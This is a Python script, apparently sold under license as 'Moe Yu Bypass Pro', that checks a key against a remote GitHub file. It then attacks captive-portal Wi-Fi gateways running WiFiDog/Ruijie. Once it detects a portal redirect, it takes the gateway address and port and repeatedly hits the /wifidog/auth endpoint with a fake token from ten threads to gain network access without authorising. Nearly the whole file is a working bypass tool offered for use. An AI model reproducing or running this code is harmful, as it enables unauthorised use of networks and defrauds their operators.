import requests, re, urllib3, time, threading, random, sys, datetime, os, uuid
from urllib.parse import urlparse, parse_qs
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from rich.text import Text

# ===============================
# CONFIG & INITIALIZATION
# ===============================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

PING_THREADS = 10
URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
stop_event = threading.Event()

# COLOR & LOGO
BABY_LOGO = "\n[bold cyan]      _ \n    _(_)_ \n   (_)@(_) \n     (_)\  / \n      /  || \n  ___/___||___\n |____________|[/bold cyan]"
BANNER = "[bold #00FF00]\n ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦\n ║║║║ ║║╣   ╚╦╝║ ║\n ╩ ╩╚═╝╚═╝   ╩ ╚═╝\n      [#00FF00]M O E   Y U   H A C K E R[/#00FF00][/bold #00FF00]"

def get_hwid():
    id_file = os.path.expanduser("~/.moe_yu_id")
    try:
        if os.path.exists(id_file):
            with open(id_file, "r") as f: return f.read().strip()
        new_id = f"MOE-{str(uuid.uuid4()).split('-')[0].upper()}"
        with open(id_file, "w") as f: f.write(new_id)
        return new_id
    except: return "MOE-DEFAULT"

def display_hacker_flag():
    console.clear()
    console.print(Align.center(BABY_LOGO))
    console.print(Align.center(BANNER))
    console.print(Align.center("[bold cyan]MOE YU BYPASS PRO ENGINE v5.2[/bold cyan]\n"))

def success_fireworks():
    for _ in range(15):
        fire = " " * random.randint(1, 45) + random.choice(["✨", "💥", "🌟", "⭐"])
        console.print(Text(fire, style=random.choice(["yellow", "cyan", "green", "white"])))
        time.sleep(0.01)

def check_expiry(expiry_str):
    if expiry_str.upper() in ["NONE", "LIFETIME", "FREE"]: return True, "Lifetime"
    try:
        expiry_date = datetime.datetime.strptime(expiry_str, '%Y-%m-%d')
        if datetime.datetime.now() > expiry_date: return False, expiry_date.strftime('%d-%b-%Y')
        return True, expiry_date.strftime('%d-%b-%Y')
    except: return True, "Lifetime"

def check_license_hacker_style():
    my_hwid = get_hwid()
    display_hacker_flag()
    console.print(Align.center(Panel(f"[bold white]HWID: [yellow]{my_hwid}[/yellow][/bold white]", border_style="bold cyan", expand=False)))
    
    user_key = input("\n  [SECURITY_ACCESS] @MoeYu_").strip()
    if not user_key: sys.exit()
    try:
        res = requests.get(URL, timeout=10)
        for entry in res.text.splitlines():
            parts = entry.split("|")
            if user_key == parts[0].strip():
                # HWID Check
                db_hwid = parts[2].strip() if len(parts) > 2 else "FREE"
                if db_hwid != "FREE" and db_hwid != my_hwid:
                    console.print("[red]❌ HWID MISMATCH![/red]"); sys.exit()
                # Expiry Check
                is_active, date_label = check_expiry(parts[1].strip() if len(parts) > 1 else "FREE")
                if not is_active:
                    console.print(f"[red]❌ EXPIRED! (Expiry: {date_label})[/red]"); sys.exit()
                
                success_fireworks()
                console.print(f"[bold green]>>> ACCESS GRANTED | STATUS: {date_label}[/bold green]\n")
                return True
        console.print("[red]❌ INVALID KEY![/red]"); sys.exit()
    except: console.print("[red]📡 CONNECTION ERROR![/red]"); sys.exit()

# ===============================
# BYPASS ENGINE (RUJIE/WIFIDOG)
# ===============================
def start_bypass_process():
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36'})
    
    while not stop_event.is_set():
        try:
            r = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
            if r.status_code != 204:
                # Portal Detected
                p = parse_qs(urlparse(r.url).query)
                gw_address = p.get('gw_address', ['192.168.110.1'])[0]
                gw_port = p.get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw_address}:{gw_port}/wifidog/auth?token=123456"
                
                console.print(f"[green][✓] Portal Detected: {gw_address}[/green]")
                
                def pulse_ping():
                    while not stop_event.is_set():
                        try: session.get(auth_link, timeout=5)
                        except: pass
                        time.sleep(2)

                for _ in range(PING_THREADS):
                    threading.Thread(target=pulse_ping, daemon=True).start()
                
                while True: time.sleep(10)
            else:
                time.sleep(5)
        except: time.sleep(5)

if __name__ == "__main__":
    if check_license_hacker_style():
        console.print(Panel(Align.center("[bold white]🔥 MOE YU BYPASS ACTIVATED 🔥[/bold white]"), border_style="bold red", expand=False))
        try: start_bypass_process()
        except KeyboardInterrupt: sys.exit()
